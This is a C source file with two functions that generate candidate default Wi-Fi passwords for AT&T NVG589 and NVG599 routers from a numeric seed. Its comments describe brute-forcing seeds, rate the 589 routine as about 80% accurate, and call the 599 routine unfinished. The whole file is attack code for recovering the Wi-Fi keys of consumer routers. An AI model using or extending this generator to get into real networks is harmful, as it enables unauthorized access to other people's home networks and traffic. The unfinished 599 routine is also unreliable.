/*
 * Thank you to mrfancypants for research and preliminary Python code for ATTXXXXXXX networks.
 */
#include <math.h>
#include "att.h"
#include <pthread.h>

// nvg589 password algorithm, about 80% accurate
void genpass589(unsigned x, unsigned char *buf) {
	static const char CHARSET[] = "abcdefghijkmnpqrstuvwxyz23456789#%+=?";
	long long x1 = x * 465661287.5245797; // thank you mrfancypants for finding this number
	long long x2 = x1;
	int i;
	buf[12] = 0; // create buffer for password

	/**
	 * This code finds the associated ascii value in the charset specified above
	 * If we knew the seed they were using, we wouldn't have to bruteforce every
	 * possibility
	 */
	for (i = 0; i < 6; i++) {
		int k1 = CHARSET[x2 % 37];
		x2 /= 37;
		int k2 = 50 + (x2 % 8);
		x2 /= 37;
		buf[(10 - (i * 2)) + 1] = k1;
		buf[(10 - (i * 2)) + 0] = k2;
	}
}

// nvg599 password algorithm, not finished
void genpass599(unsigned y, unsigned char *buf) {
	static const char CHARSET[] = "abcdefghijkmnpqrstuvwxyz23456789#%+=?";
	long long y1 = y * pow(2,32)+2; // thank you mrfancypants for finding this number
	long long y2 = y1;
	int i;
	buf[12] = 0; // create buffer for password

	/**
	 * This code finds the associated ascii value in the charset specified above
	 * If we knew the seed they were using, we wouldn't have to bruteforce every
	 * possibility
	 */
	for (i = 0; i < 6; i++) {
		int k1 = CHARSET[y2 % 37];
		y2 /= 37;
		int k2 = 50 + (y2 % 8);
		y2 /= 37;
		buf[(10 - (i * 2)) + 1] = k1;
		buf[(10 - (i * 2)) + 0] = k2;
	}
}
